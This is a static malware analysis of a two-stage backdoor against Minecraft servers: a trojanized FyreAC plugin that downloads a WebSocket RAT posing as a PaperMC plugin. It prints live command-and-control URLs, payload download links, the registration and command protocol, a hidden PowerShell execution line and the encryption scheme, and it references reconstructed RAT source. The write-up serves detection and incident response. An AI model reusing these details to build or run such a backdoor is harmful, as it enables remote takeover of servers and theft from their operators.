# FyreAC → PaperFix RAT — static reconstruction

Two-stage backdoor chain targeting Minecraft servers running the FyreAC/GrimAC
fork. The first stage is a hidden downloader inside a trojanized FyreAC plugin.
It drops `paperfix-3.2.6.jar`, a single-class WebSocket RAT disguised as a
PaperMC plugin. The RAT provides Minecraft console command execution, OS shell
execution, and AES-GCM encrypted multi-step tasking.

The original artifacts were never executed. Everything below was recovered from
bytecode, `javap`, CFR output, archive metadata, and constant-pool strings.

## Samples

| Property | Stage 1 | Stage 2 |
|---|---|---|
| File | `fyreac-bukkit-2.3.74-a6a602d.jar` | `paperfix-3.2.6-obfuscated.jar` |
| SHA-256 | `ad6e0d958eb1a8967f1d06536aa4ed98e1970721bd2b5b2dc7cb2e87284da5d6` | `fb52ed5592921a3f6dae2ad32e9e19874803fe554c2e208d4c5f164f851d511c` |
| Size | 14,877,457 bytes | 11,885,290 bytes |
| Classes | 5,266 | 8,731 |
| Malicious entries | 2 | 1 |
| Build metadata | original Maven build + two post-build entries (`2026-09-17 16:21:28`) | one build, all entries `2026-11-03 16:53:02` |

Malicious classes:

| Role | Entry | SHA-256 |
|---|---|---|
| Stage-1 stager | `ac/grim/grimac/shaded/fastutil/ints/ConsumerIntBig.class` | `8392f1d3fa9f7c981212fe678df96c95c24adaf294f809f12678abd0c7ad760d` |
| Stage-1 trigger | `ac/grim/grimac/platform/bukkit/GrimACBukkitLoaderPlugin.class` | `79ddf28ae7a583314c6c3df9fb9f6cd5038a8d8d722c6a14dd69f25e0181656f` |
| Stage-2 RAT | `org/papermc/paperfix/paperfix.class` | `701da967affae189f6e3a1a853ee36fad6a13ed8cd4ad71a231ba0aa7548a8e1` |

## Execution chain

```text
FyreAC onEnable()
  └─ ConsumerIntBig.comparatorsIndirect(this)
       ├─ GET http://crimson-tree-cf44.blaher331.workers.dev/api/asdfg2asd
       ├─ download/replace plugins/paperfix-3.2.6.jar
       ├─ replace plugins matching the manifest's "also" regexes
       └─ console "stop" after 100 ticks (~5 s)

server restart
  └─ PaperFix RAT (load: STARTUP)
       ├─ read server-port, register or load .cache/.srvinfo
       ├─ WSS /api/aguysdfsd89asdfa?id=<id>&pass=<pass>
       ├─ ping every 30 s; reconnect 100 ticks after close/error
       └─ handle minecraft / os / script messages
```

## Stage 1 — hidden downloader

`ConsumerIntBig` is disguised as a fastutil functional interface. It does not
exist in upstream fastutil 8.5.15 and is compiled for Java 8 (major 52) while
the rest of FyreAC is Java 17 (major 61), indicating separate compilation and
post-build insertion. The modified loader calls it from `onEnable()`:

```java
ConsumerIntBig.comparatorsIndirect(this);
```

The stager registers a no-op Bukkit listener and fetches a manifest:

```json
{
  "url": "http://.../payload.jar",
  "sha256": "<expected hash of the local file>",
  "also": [
    {"namePattern": "SomePlugin-.*\\.jar", "url": "http://.../x.jar", "sha256": "..."}
  ]
}
```

`patchFile()` downloads the primary payload to `plugins/paperfix-3.2.6.jar` when
the local file is missing or its hash differs from the manifest. The downloaded
bytes are not verified. Any matching `also` entries overwrite other plugin JARs.
After a replacement, the stager schedules console `stop` 100 ticks later.

Two entries carry timestamp `2026-09-17 16:21:28`; every other entry is
`1980-02-01`, the default for the original reproducible Maven build.

### Captured manifest

[`manifest.txt`](manifest.txt) is the live response from `/api/asdfg2asd`; the
JSON is unchanged and only the terminal prompt/local path was removed.

Primary payload:

```text
https://gitlab.com/blaher331/nigea/-/raw/main/paperfix-3.2.6-obfuscated.jar?inline=false
sha256 fb52ed5592921a3f6dae2ad32e9e19874803fe554c2e208d4c5f164f851d511c
```

The hash matches the analyzed stage-2 JAR. The `also` array targets three
common server plugins:

| Pattern | Replacement download | SHA-256 |
|---|---|---|
| `LuckPerms.*\.jar` | `https://github.com/fyreac/fyreac/releases/download/67/LuckPerms-Bukkit-5.5.53.jar` | `c75e2b31699eb929290a1706571e3a13da68b9d5776d786aeda8dfeeb214c3d5` |
| `voicechat.*\.jar` | `https://github.com/fyreac/fyreac/releases/download/67/voicechat-bukkit-2.6.23.jar` | `4e5b903e006222bbc76e48ed8623a55eb0dfc8c57a41c36144b029cad14b2fcc` |
| `TAB.*\.jar` | `https://github.com/fyreac/fyreac/releases/download/67/TAB.v6.1.3.jar` | `cf60fd044b307658d246c1646916bfd6606e7c2c7bfb427c3e2c90087cab0b92` |

This turns the stager into a generic plugin-replacement primitive: any server
with LuckPerms, Simple Voice Chat, or TAB is a candidate for a second-stage
swap, not just the FyreAC installation.

## Stage 2 — PaperFix RAT

`plugin.yml` impersonates PaperMC and forces early load:

```yaml
name: paperfix
version: 3.2.6
main: org.papermc.paperfix.paperfix
author: PaperMC
load: STARTUP
```

The JAR contains 8,730 shaded/relocated dependency classes (JDA, Jackson,
OkHttp, Okio, Kotlin, fastutil, Byte Buddy/ASM, SLF4J, Commons Collections,
TweetNacl, nv-websocket-client). Only `org/papermc/paperfix/paperfix.class`
references Bukkit, the C2, `ProcessBuilder`, AES, and
`java.net.http.WebSocket`. Gson is not bundled; the RAT uses the server's
classpath.

### Registration and state

```http
POST https://crimson-tree-cf44.blaher331.workers.dev/api/sdf8gusdf3/register
Content-Type: application/json

{"port": <server-port>}
```

The response supplies `id` and `pass`, saved to `.cache/.srvinfo`:

```json
{"id":"<id>","pass":"<password>"}
```

The file is reused on later starts. `pass` is also the AES key material.

### Command channel

```text
wss://crimson-tree-cf44.blaher331.workers.dev/api/aguysdfsd89asdfa?id=<id>&pass=<pass>
```

| Message | Behavior |
|---|---|
| `minecraft` | Dispatch `command` as the console sender on the main thread |
| `os` | Run `command` through the OS shell, return combined output |
| `script` | Base64 + AES-GCM JSON with `steps` array |

Shell selection:

- Linux/Unix: `/bin/bash -c <command>`
- Windows: `powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command <command>`

Output is merged (stderr → stdout), capped at 950 characters, and `[no output]`
is substituted when empty.

### Script tasking

```json
{
  "steps": [
    {"type":"mc",    "command":"say hello"},
    {"type":"os",    "command":"whoami"},
    {"type":"sleep", "seconds":5},
    {"type":"log",   "text":"checkpoint"}
  ]
}
```

Each step returns `{"i","type","ok","output"}` in a `results` array. `mc` waits
up to 10 seconds on `callSyncMethod`; `sleep` blocks the worker; `log` is a
no-op marker.

### Cryptography

| Property | Value |
|---|---|
| Key | `SHA-256(pass)` UTF-8 |
| Algorithm | `AES/GCM/NoPadding` |
| IV | 12 random bytes, prepended |
| Tag | 128 bits |
| Encoding | Base64 |

## Web delivery and IP logging

[`script.js`](script.js) is the script served from `fyreac.space`. It is not
part of the plugin chain, but it is part of the same delivery infrastructure:

1. Fetches the visitor IP from `https://api.ipify.org?format=json`.
2. Sets `comment` to `Opened`, or `Downloaded` if the page's `.dl` element is
   clicked.
3. POSTs the IP and status to `https://crimson-tree-cf44.blaher331.workers.dev/api/sasd2`.
4. Adds decoy fields `fake1: "127.0.0.1"`, `fake2: "0.0.0.0"`, and a random
   `junk` value.
5. Re-sends the report when the download element is clicked.

This gives the operator a visitor IP log keyed to whether the download button
was used, independent of the Minecraft plugin chain.

## Deobfuscation

The dependency classes were package-relocated, not logic-obfuscated. They keep
their original `SourceFile` names and library strings. The malicious class keeps
`SourceFile: "paperfix.java"`; only local identifiers were renamed.

Relocated roots:

| Prefix | Classes | Identification |
|---|---:|---|
| `a/a/**` | 1,562 | fastutil |
| `b/**` | 948 | Kotlin stdlib |
| `net/a/**` | 2,879 | Byte Buddy + shaded ASM |
| `org/a/**` | 27 | IntelliJ annotations |
| `org/b/**` | 32 | JetBrains annotations |
| `org/c/**` | 38 | SLF4J |
| `org/apache/a/a/**` | 524 | Commons Collections |
| `com/a/**` | 9 | TweetNaclFast |
| `com/b/**` | 68 | nv-websocket-client |
| `org/papermc/paperfix/libs/**` | 2,644 | Jackson, JDA, OkHttp, Okio |

RAT member map:

| Obfuscated | Recovered | Role |
|---|---|---|
| `a` | `webSocket` | Active WebSocket |
| `b` | `serverId` | Registration id |
| `c` | `password` | Registration password / key material |
| `d` | `gson` | JSON codec |
| `e` | `pingExecutor` | Keepalive scheduler |
| `f` | `IS_WINDOWS` | Shell selection |
| `g` / `h` | `GCM_IV_LENGTH` / `GCM_TAG_BITS` | 12 / 128 |
| `a()` | `startPingTask()` | 30-second ping |
| `b()` | `readServerPort()` | `server.properties` |
| `a(int)` | `registerOrLoadCredentials(int)` | Registration / state |
| `c()` | `connectWebSocket()` | WSS connect |
| `d()` | `deriveAesKey()` | `SHA-256(pass)` |
| `a(byte[])` | `decrypt(byte[])` | AES-GCM decrypt |
| `a(String)` | `encrypt(String)` | AES-GCM encrypt |
| `a(JsonObject)` | `runScriptSteps(JsonObject)` | Script interpreter |
| `b(String)` | `executeOsCommand(String)` | Shell execution |

`javap -p` also exposes compiler-generated lambda bodies (`c(String)`,
`d(String)`, `a(String,String,WebSocket)`, `b(String,String,WebSocket)`,
`e()`); the reconstruction was checked against all of them, including the
950-character cap, silent exception handlers, 100-tick reconnect, and exact
AES-GCM IV/tag layout.

## Indicators

```text
crimson-tree-cf44.blaher331.workers.dev
/api/asdfg2asd
/api/sdf8gusdf3/register
/api/aguysdfsd89asdfa
/api/sasd2
gitlab.com/blaher331/nigea
github.com/fyreac/fyreac
fyreac.space
plugins/paperfix-3.2.6.jar
.cache/.srvinfo
```

Host behavior:

- Java process spawning `/bin/bash -c` or hidden PowerShell on a Minecraft host
- Server stops seconds after startup/plugin enable with no operator action
- Outbound HTTP GET to `/api/asdfg2asd`
- Outbound HTTPS POST to `/api/sdf8gusdf3/register` with `{"port":...}`
- Long-lived WebSocket to `/api/aguysdfsd89asdfa`
- Browser visits to `fyreac.space` followed by a POST to `/api/sasd2`
- Empty `User-Agent` on stage-1 payload downloads
- `.cache/.srvinfo` containing `id` and `pass`

## Analysis files

| File | Original class | Purpose |
|---|---|---|
| `src/FyreACStager.java` | `ConsumerIntBig` | Stage-1 manifest fetch, plugin replacement, forced stop |
| `src/PaperFixRAT.java` | `org.papermc.paperfix.paperfix` | Stage-2 WebSocket RAT |
| `manifest.txt` | — | Captured stage-1 C2 manifest and replacement-plugin URLs |
| `script.js` | — | `fyreac.space` visitor IP logger |

Both files retain the original package declarations so they can be compared
against the decompiled class. Class/file names are changed for readability; the
reconstruction is behavior-oriented, not byte-identical.

Compile check requires Paper/Bukkit and Gson on the classpath:

```bash
javac -cp paper-api.jar:gson.jar -d out src/*.java
```

Both files were syntax-checked against minimal Bukkit/Gson stubs. They were not
compiled against a live server and were not executed.

## Detection

YARA rule: [`../../yara/fyrerat.yar`](../../yara/fyrerat.yar)

The rules cover:

- the raw stage-1 JAR (ZIP magic + stager entry name),
- the extracted stager class,
- the stage-1 manifest payload/replacement hosts,
- the raw stage-2 JAR (RAT entry + relocated libs),
- the extracted RAT class,
- the `fyreac.space` IP logger,
- shared C2 strings for memory/unpacked scans,
- exact hashes of the analyzed samples.

Test against extracted classes, not the compressed JAR, for the class rules:

```bash
unzip -q fyreac-bukkit-2.3.74-a6a602d.jar -d extracted
yara ../../yara/fyrerat.yar extracted
rm -rf extracted
```

## Limitations

- Static analysis only; the C2 was not contacted and no sample was executed.
- Registration response parsing is inferred from client code, not observed.
- Dependency versions come from metadata/strings, not a lockfile.
- The C2 domain is a Cloudflare Worker subdomain and may rotate; pair the
  domain IOCs with host behavior.
- The stage-1 stager can replace arbitrary plugins through the `also` manifest,
  so incident response must verify every plugin JAR, not just `paperfix`.
